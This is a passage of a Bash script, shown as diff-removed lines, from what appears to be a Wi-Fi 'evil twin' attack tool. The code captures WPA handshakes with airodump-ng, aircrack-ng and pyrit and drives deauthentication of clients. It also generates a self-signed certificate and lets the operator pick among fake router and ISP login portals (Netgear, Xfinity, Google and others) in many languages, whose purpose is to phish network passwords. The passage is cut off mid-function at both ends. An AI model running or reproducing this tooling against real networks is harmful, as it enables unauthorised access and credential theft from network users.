-                                deauth
-
-                        fi
-
-                        capture
-                        for CLIENT in $HOST; do
-                                Client_MAC=`echo ${CLIENT:0:17}`
-                                deauthesp
-                        done
-                        $DEAUTH
-                        CSVDB=$Host_MAC-01.csv
-                ;;
-        esac
-
-
-        deauthMENU
-
-}
-
-function deauthMENU {
-
-        if [ "$FLUX_AUTO" = "1" ];then
-                while true;do
-                        checkhandshake && sleep 5
-                done
-        else
-
-                while true; do
-                        conditional_clear
-
-                        clear
-                        top
-
-                        echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_deauthMENU "
-                        echo
-                        echo -e "Status handshake: $Handshake_statuscheck"
-                        echo
-                        echo -e "      "$red"["$yellow"1"$red"]"$grey" $deauthMENU_option_1"
-                        echo -e "      "$red"["$yellow"2"$red"]"$transparent" $general_back "
-                        echo -e "      "$red"["$yellow"3"$red"]"$transparent" Select another network"
-                        echo -e "      "$red"["$yellow"4"$red"]"$transparent" Exit"
-                        echo -n '      #> '
-                        read yn
-
-                        case $yn in
-                                1 ) checkhandshake;;
-                                2 ) conditional_clear; killall xterm; askclientsel; break;;
-                                3 ) killall airodump-ng mdk3 aireplay-ng xterm &>$flux_output_device; CSVDB=dump-01.csv; breakmode=1; killall xterm; selection; break ;;
-                                4 ) exitmode; break;;
-                                * ) echo "
-        $general_case_error"; conditional_clear ;;
-                        esac
-
-                done
-        fi
-}
-
-# Capture all
-function capture {
-
-        conditional_clear
-        if ! ps -A | grep -q airodump-ng; then
-
-                rm -rf $DUMP_PATH/$Host_MAC*
-                xterm $HOLD -title "Capturing data on channel --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng  --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR --ignore-negative-one &
-        fi
-}
-
-# Check the handshake before continuing
-function checkhandshake {
-
-        if [ "$handshakemode" = "normal" ]; then
-                if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
-                        killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
-                        wpaclean $HANDSHAKE_PATH/$Host_SSID2-$Host_MAC.cap $DUMP_PATH/$Host_MAC-01.cap &>$flux_output_device
-                        certssl
-                        i=2
-                        break
-
-                else
-                        Handshake_statuscheck="${red}Not_Found$transparent"
-
-                fi
-        elif [ "$handshakemode" = "hard" ]; then
-                pyrit -r $DUMP_PATH/$Host_MAC-01.cap -o $DUMP_PATH/test.cap stripLive &>$flux_output_device
-
-                if pyrit -r $DUMP_PATH/test.cap analyze 2>&1 | grep -q "good,"; then
-                        killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
-                        pyrit -r $DUMP_PATH/test.cap -o $HANDSHAKE_PATH/$Host_SSID2-$Host_MAC.cap strip &>$flux_output_device
-                        certssl
-                        i=2
-                        break
-
-                else
-                        if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
-                                Handshake_statuscheck="${yellow}Corrupted$transparent"
-                        else
-                                Handshake_statuscheck="${red}Not_found$transparent"
-
-                        fi
-                fi
-
-                rm $DUMP_PATH/test.cap &>$flux_output_device
-        fi
-
-}
-
-############################################# < HANDSHAKE > ############################################
-
-function certssl {
-
-# Test if the ssl certificate is generated correcly if there is any
-
-        if [ -f $DUMP_PATH/server.pem ]; then
-                if [ -s $DUMP_PATH/server.pem ]; then
-                        webinterface
-                        break
-                else
-
-                        if [ "$FLUX_AUTO" = "1" ];then
-                                creassl
-                        fi
-                        while true;do
-                        conditional_clear
-                        top
-                        echo "                                       "
-                        echo -e ""$red"["$yellow"2"$red"]"$transparent" Certificate invalid or not present, please choose an option"
-                        echo "                                       "
-                        echo -e "      "$red"["$yellow"1"$red"]"$grey" Create a SSL certificate"
-                        echo -e "      "$red"["$yellow"2"$red"]"$transparent" Search for SSL certificate" # hop to certssl check again
-                        echo -e "      "$red"["$yellow"3"$red"]"$red" Exit" $transparent
-                        echo " "
-                        echo -n '      #> '
-                        read yn
-
-                        case $yn in
-                                1 ) creassl;;
-                                2 ) certssl;break;;
-                                3 ) exitmode; break;;
-                                * ) echo "$general_case_error"; conditional_clear
-                        esac
-                        done
-                 fi
-        else
-                        if [ "$FLUX_AUTO" = "1" ];then
-                                creassl
-                        fi
-
-                        while true; do
-                        conditional_clear
-                        top
-                        echo "                                                                      "
-                        echo "  Certificate invalid or not present, please choice"
-                        echo "                                       "
-                        echo -e "      "$red"["$yellow"1"$red"]"$grey" Create  a SSL certificate"
-                        echo -e "      "$red"["$yellow"2"$red"]"$transparent" Search for SSl certificate" # hop to certssl check again
-                        echo -e "      "$red"["$yellow"3"$red"]"$red" Exit" $transparent
-                        echo " "
-                        echo -n '      #> '
-                        read yn
-
-                        case $yn in
-                                1 ) creassl;;
-                                2 ) certssl; break;;
-                                3 ) exitmode; break;;
-                                * ) echo "$general_case_error"; conditional_clear
-                        esac
-                done
-        fi
-
-
-
-}
-
-# Create Self-Signed SSL Certificate
-function creassl {
-        xterm -title "Create Self-Signed SSL Certificate" -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout /$DUMP_PATH/server.pem -out /$DUMP_PATH/server.pem # more details there https://www.openssl.org/docs/manmaster/apps/openssl.html
-        certssl
-}
-
-############################################# < ATAQUE > ############################################
-
-# Select attack strategie that will be used
-function webinterface {
-
-
-        chmod 400 $DUMP_PATH/server.pem
-
-        if [ "$FLUX_AUTO" = "1" ];then
-                matartodo; ConnectionRESET; selection
-        else
-                while true; do
-                        conditional_clear
-                        top
-
-                        infoap
-                        echo
-                        echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_webinterface"
-                        echo
-                        echo -e "      "$red"["$yellow"1"$red"]"$grey" Web Interface"
-                        echo -e "      "$red"["$yellow"2"$red"]"$transparent" \e[1;31mExit"$transparent""
-                        echo
-                        echo -n "#? "
-                        read yn
-                        case $yn in
-                        1 ) matartodo; ConnectionRESET; selection; break;;
-                        2 ) matartodo; exitmode; break;;
-                        esac
-                done
-        fi
-}
-
-function ConnectionRESET {
-
-        if [ "$FLUX_AUTO" = "1" ];then
-                webconf=1
-        else
-                while true; do
-                        conditional_clear
-                        top
-
-                        infoap
-                        n=1
-
-                        echo
-                        echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_ConnectionRESET"
-                        echo
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  English     [ENG]  (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  German      [GER]  (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Russian     [RUS]  (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Italian     [IT]   (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Spanish     [ESP]  (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Portuguese  [POR]  (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Chinese     [CN]   (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  French      [FR]   (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Turkish     [TR]   (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Romanian    [RO]   (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Hungarian   [HU]   (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Arabic      [ARA]  (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Greek       [GR]   (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Czech       [CZ]   (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Norwegian   [NO]   (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Bulgarian   [BG]   (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Serbian     [SRB]  (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Polish      [PL]   (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Indonesian  [ID]   (NEUTRA)";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Dutch       [NL]   (NEUTRA)";n=`expr $n + 1`
-                echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Danish      [DAN]  (NEUTRA)";n=`expr $n + 1`
-                echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Hebrew      [HE]   (NEUTRA)";n=`expr $n + 1`
-                echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Thai        [TH]   (NEUTRA)";n=`expr $n + 1`
-            echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Portuguese  [BR]   (NEUTRA)";n=`expr $n + 1`
-            echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Slovenian   [SVN]  (NEUTRA)";n=`expr $n + 1`
-            echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Belkin      [ENG]";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Netgear     [ENG]";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Huawei      [ENG]";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Verizon     [ENG]";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Netgear     [ESP]";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Arris       [ESP]";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Vodafone    [ESP]";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" TP-Link     [ENG]";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Ziggo       [NL]";n=` expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" KPN         [NL]";n=` expr $n + 1`
-            echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Ziggo2016   [NL]";n=` expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" FRITZBOX_DE [DE] ";n=` expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" FRITZBOX_ENG[ENG] ";n=` expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" GENEXIS_DE  [DE] ";n=` expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Login-Netgear[Login-Netgear] ";n=` expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Login-Xfinity[Login-Xfinity] ";n=` expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Telekom ";n=` expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Google";n=` expr $n + 1`
-      echo -e "      "$red"["$yellow"$n"$red"]"$transparent" MOVISTAR     [ESP]";n=`expr $n + 1`
-                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"\e[1;31m $general_back"$transparent""
-                        echo
-                        echo -n "#? "
-                        read webconf
-
-                        if [ "$webconf" = "1" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ENG
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ENG
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ENG
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_ENG
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ENG
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ENG
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_ENG
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_ENG
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_ENG
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_ENG
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "2" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_GER
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_GER
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_GER
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_GER
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_GER
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_GER
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_GER
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_GER
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_GER
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_GER
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "3" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_RUS
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_RUS
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_RUS
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_RUS
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_RUS
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_RUS
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_RUS
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_RUS
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_RUS
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_RUS
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "4" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_IT
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_IT
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_IT
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_IT
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_IT
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_IT
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_IT
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_IT
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_IT
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_IT
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "5" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ESP
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ESP
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ESP
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_ESP
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ESP
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ESP
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_ESP
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_ESP
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_ESP
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_ESP
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "6" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_POR
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_POR
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_POR
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_POR
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_POR
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_POR
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_POR
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_POR
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_POR
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_POR
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "7" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_CN
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_CN
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_CN
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_CN
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_CN
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_CN
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_CN
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_CN
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_CN
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_CN
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "8" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_FR
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_FR
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_FR
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_FR
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_FR
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_FR
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_FR
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_FR
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_FR
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_FR
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "9" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_TR
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_TR
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_TR
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_TR
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_TR
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_TR
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_TR
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_TR
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_TR
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_TR
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "10" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_RO
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_RO
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_RO
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_RO
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_RO
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_RO
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_RO
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_RO
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_RO
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_RO
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "11" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_HU
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_HU
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_HU
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_HU
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_HU
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_HU
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_HU
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_HU
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_HU
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_HU
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "12" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ARA
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ARA
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ARA
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_ARA
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ARA
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ARA
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_ARA
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_ARA
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_ARA
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_ARA
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "13" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_GR
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_GR
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_GR
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_GR
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_GR
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_GR
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_GR
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_GR
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_GR
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_GR
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "14" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_CZ
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_CZ
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_CZ
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_CZ
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_CZ
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_CZ
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_CZ
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_CZ
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_CZ
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_CZ
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "15" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_NO
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_NO
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_NO
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_NO
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_NO
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_NO
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_NO
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_NO
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_NO
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_NO
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "16" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_BG
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_BG
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_BG
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_BG
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_BG
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_BG
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_BG
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_BG
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_BG
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_BG
-                                NEUTRA
-                                break
-
-            elif [ "$webconf" = "17" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_SRB
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_SRB
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_SRB
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_SRB
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_SRB
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_SRB
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_SRB
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_SRB
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_SRB
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_SRB
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "18" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_PL
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_PL
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_PL
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_PL
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_PL
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_PL
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_PL
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_PL
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_PL
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_PL
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "19" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ID
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ID
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ID
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_ID
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ID
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ID
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_ID
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_ID
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_ID
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_ID
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = "20" ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_NL
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_NL
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_NL
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_NL
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_NL
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_NL
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_NL
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_NL
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_NL
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_NL
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = 21 ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_DAN
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_DAN
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_DAN
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_DAN
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_DAN
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_DAN
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_DAN
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_DAN
